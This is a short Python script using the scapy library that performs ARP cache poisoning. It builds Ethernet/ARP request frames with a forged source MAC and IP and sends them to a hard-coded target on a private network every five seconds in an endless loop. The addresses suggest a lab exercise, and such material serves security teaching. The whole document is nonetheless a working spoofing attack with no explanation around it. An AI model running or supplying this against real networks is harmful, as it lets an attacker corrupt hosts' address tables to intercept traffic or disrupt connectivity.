#!/usr/bin/env python3
from scapy.all import *
from time import sleep

TARGET_IP  = "192.168.33.143"
TARGET_MAC = "00:0c:29:8a:fd:22"
FAKE_IP    = "11.22.33.44"
FAKE_MAC   = "aa:bb:cc:dd:ee:ff"


if __name__ == "__main__":
    frame = Ether()
    frame.src = FAKE_MAC
    frame.dst = TARGET_MAC

    arp = ARP()
    arp.hwsrc = FAKE_MAC
    arp.psrc = FAKE_IP
    arp.pdst = TARGET_IP
    arp.op = 1

    packet = frame/arp
    while True:
        sendp(packet)
        sleep(5)
